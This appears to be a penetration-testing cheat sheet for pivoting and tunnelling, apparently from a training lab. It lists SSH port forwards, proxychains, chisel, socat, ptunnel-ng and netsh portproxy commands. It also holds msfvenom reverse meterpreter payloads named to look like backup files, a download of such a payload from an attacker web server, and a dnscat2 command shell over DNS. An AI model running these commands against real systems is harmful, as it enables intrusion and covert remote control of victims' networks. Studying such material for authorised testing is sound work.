# Pivoting, Tunnelling and Port Forwarding

## Network Configuration and Monitoring

```bash
ifconfig
ipconfig
netstat -r
netstat -antp | grep 1234
netstat -antb | findstr 1080
```

## Nmap

```bash
nmap -sT -p22,3306 <IP>
nmap -v -sV -p1234 localhost
```

## SSH and Tunneling

```bash
ssh -L 1234:localhost:3306 ubuntu@<IP>
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IP>
ssh -D 9050 ubuntu@<IP>
ssh -R <PivotHostIP>:8080:0.0.0.0:80 ubuntu@<IP> -vN
```

## Proxychains

```bash
tail -4 /etc/proxychains.conf
proxychains nmap -v -sn 172.16.5.1-200
proxychains msfconsole
```

## Metasploit

```bash
search rdp_scanner
use exploit/multi/handler
use auxiliary/server/socks_proxy
jobs
use post/multi/manage/autoroute
```

## File Transfer

```bash
scp backupscript.exe ubuntu@<IP>:~/
scp -r rpivot ubuntu@<IP>
python3 -m http.server 8123
Invoke-WebRequest -Uri "http://<IP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## Metasploit Payloads

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PivotIP> LPORT=8080 -f exe -o backupscript.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<AttackIP> LPORT=8080 -f elf -o backupjob
```

## Socat

```bash
socat TCP4-LISTEN:8080,fork TCP4:<AttackIP>:80
```

## Plink

```bash
plink -D 9050 ubuntu@<IP>
```

## SSHuttle

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v
```

## RPivot

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

## DNScat2

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

## Chisel

```bash
./chisel server -v -p 1234 --socks5
./chisel client -v 10.129.202.64:1234 socks
```

## Ptunnel-ng

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

## Windows PortProxy

```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=<IP> connectport=3389 connectaddress=172.16.5.25
netsh interface portproxy show v4tov4
```
